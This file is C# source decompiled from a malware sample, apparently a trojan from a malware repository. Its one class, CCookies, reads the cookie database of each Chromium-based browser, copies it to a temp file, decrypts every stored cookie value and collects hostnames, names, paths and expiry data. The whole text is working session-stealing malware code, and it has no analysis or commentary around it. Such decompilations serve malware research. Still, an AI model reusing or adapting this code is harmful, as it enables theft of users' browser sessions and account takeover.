// Decompiled with JetBrains decompiler
// Type: pazuzu.ChromiumBased.CCookies
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.ChromiumBased
{
  internal class CCookies
  {
    public static List<Common.CCookie> Get()
    {
      string str1 = "Cookies";
      List<Common.CCookie> ccookieList = new List<Common.CCookie>();
      foreach (string chromiumBasedBrowser in Paths.chromiumBasedBrowsers)
      {
        string str2 = Paths.GetUserData(chromiumBasedBrowser) + str1;
        if (File.Exists(str2))
        {
          string str3 = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
          if (File.Exists(str3))
            File.Delete(str3);
          File.Copy(str2, str3);
          SQLite sqLite = new SQLite(str3);
          sqLite.ReadTable("cookies");
          for (int rowNum = 0; rowNum < sqLite.GetRowCount(); ++rowNum)
          {
            string password = sqLite.GetValue(rowNum, 12);
            string str4 = sqLite.GetValue(rowNum, 1);
            string text = sqLite.GetValue(rowNum, 2);
            string str5 = sqLite.GetValue(rowNum, 4);
            string str6 = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10L * Convert.ToInt64(sqLite.GetValue(rowNum, 5))), TimeZoneInfo.Local));
            string upper = sqLite.GetValue(rowNum, 6).ToUpper();
            if (!string.IsNullOrEmpty(text))
              ccookieList.Add(new Common.CCookie()
              {
                value = Crypt.GetUTF8(Crypt.decryptChrome(password, str2)),
                hostname = str4,
                name = Crypt.GetUTF8(text),
                path = str5,
                expiresutc = str6,
                issecure = upper
              });
            else
              break;
          }
        }
      }
      return ccookieList;
    }
  }
}
